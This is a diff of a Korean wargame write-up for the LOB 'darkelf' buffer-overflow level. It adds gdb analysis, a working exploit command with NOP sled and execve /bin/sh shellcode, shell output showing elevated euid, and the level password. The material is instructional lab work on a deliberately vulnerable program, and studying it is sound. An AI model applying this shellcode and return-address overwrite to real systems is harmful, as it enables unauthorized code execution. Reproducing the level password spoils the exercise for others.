@@ -56,7 +56,7 @@ main(int argc, char *argv[])
 - 환경 변수를 `\x00`으로 초기화
 - 인자 argv[1]의 길이 값 체크
 
-
+<br>
 
 `argv[1]`의 길이 값 체크 부분이 추가되었기 때문에 해당 인자에 쉘코드를 삽입해 실행할 수 없다.
 그렇다면 `argv[2]`를 이용해 쉘코드를 삽입할 경우 길이 값 체크 부분은 우회될 수 있을것 같다.
@@ -102,7 +102,7 @@ End of assembler dump.
 Breakpoint 1 at 0x80485f2
 ```
 
-
+<br>
 
 먼저 main 함수를 디스어셈블하여 strcpy 함수 실행 직후 부분인 `main+242`에 브레이크 포인트를 걸어준다.
 
@@ -135,7 +135,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
 
-
+<br>
 
 `continue`하여 프로그램이 실행된 직후 `esp-80` 부분을 확인해보니
 
@@ -156,7 +156,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
 
-
+<br>
 
 `buf` 에서 조금 떨어진 부분을 확인해보니 인자`argv[1]`에 해당되는 부분을 확인할 수 있었으며
 
@@ -206,5 +206,92 @@ Program received signal SIGSEGV, Segmentation fault.
 0xbffffcb0:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
+<br>
 
+먼저 gdb 상에서 다음과 같이 `argv[2]` 인자 값에 `x90(NOP)`을 일정 개수만큼 추가해 실행한 뒤
 
+`ebp`를 확인해보면 `ebp+c`위치에 `**argv[]` 주소 값이 존재함을 확인할 수 있다.
+
+이 주소를 따라가보면 `argv[0],[1],[2]`의 시작 주소가 존재한다.
+
+위 3개의 매개 변수 중 쉘 코드를 삽입할 위치는 `argv[2]` 이다.
+
+`argv[2]`의 시작 주소 `0xbffffc43`를 따라가보니
+
+인자 값 `x90(NOP)`가 정상적으로 들어가 있음을 확인할 수 있었다.
+
+```
+(gdb) r `python -c "print '\x90'*44+'\xbf\xbf\xbf\xbf'"` `python -c "print '\x90'*40"`
+Starting program: /home/wolfman/tmp/darkelf `python -c "print '\x90'*44+'\xbf\xbf\xbf\xbf'"` `python -c "print '\x90'*40"`
+
+Breakpoint 1, 0x80485f2 in main ()
+(gdb) x/16wx $ebp
+0xbffffab8:	0x90909090	0xbfbfbfbf	0x00000000	0xbffffb04
+0xbffffac8:	0xbffffb14	0x40013868	0x00000003	0x08048450
+0xbffffad8:	0x00000000	0x08048471	0x08048500	0x00000003
+0xbffffae8:	0xbffffb04	0x08048390	0x0804864c	0x4000ae60
+(gdb) x/16wx 0xbffffb04
+0xbffffb04:	0xbffffbf8	0xbffffc12	0xbffffc43	0x00000000
+0xbffffb14:	0xbffffc6c	0xbffffc82	0xbffffca1	0xbffffcc3
+0xbffffb24:	0xbffffcd0	0xbffffe93	0xbffffeb2	0xbffffecf
+0xbffffb34:	0xbffffee4	0xbfffff03	0xbfffff0e	0xbfffff1e
+(gdb) x/16wx 0xbffffc43
+0xbffffc43:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc53:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc63:	0x90909090	0x90909090	0x00000000	0x00000000
+0xbffffc73:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb)
+```
+
+<br>
+
+위에서 `argv[2]` 에 값이 정상적으로 덮어 써지고 있음을 확인하였다.
+
+다음은 주어진 문제 `darkelf.c`의 소스코드 부분에서 아래와 같이 코드를 추가해 프로그램 실행 시 `argv[2]`의 시작 주소를  찾을 수 있다.
+
+ ```c
+        // check the length of argument
+        if(strlen(argv[1]) > 48){
+                printf("argument is too long!\n");
+                exit(0);
+        }
+        printf("argv[2] addr: %#x\n",argv[2]); // argv[2] address print.
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+
+        // buffer hunter
+        memset(buffer, 0, 40);
+
+}
+
+[wolfman@localhost tmp]$ gcc darkelf.c
+[wolfman@localhost tmp]$ ./a.out `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"` `python -c "print 'A'*100"`
+argv[2] addr: 0xbffffc49
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+Segmentation fault (core dumped)
+[wolfman@localhost tmp]$
+ ```
+
+<br>
+
+`argv[2]` 시작 주소인 `0xbffffc49`를 찾을 수 있었다.
+
+다음은 위 내용을 토대로 exploit 코드를 작성해보자.
+
+- argv[1]: buf[A\*40] + sfp[A\*4] + ret[argv[2]]
+- argv[2]: nop[1000] + shellcode[24]
+
+```
+[wolfman@localhost wolfman]$ ./darkelf `python -c "print 'A'*44+'\xa7\xf8\xff\xbf'"` `python -c "print '\x90'*1000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+bash$ id
+uid=505(wolfman) gid=505(wolfman) euid=506(darkelf) egid=506(darkelf) groups=505(wolfman)
+bash$ my-pass
+euid = 506
+kernel crashed
+bash$
+```
+
+###Clear! password is….
+
+kernel crashed
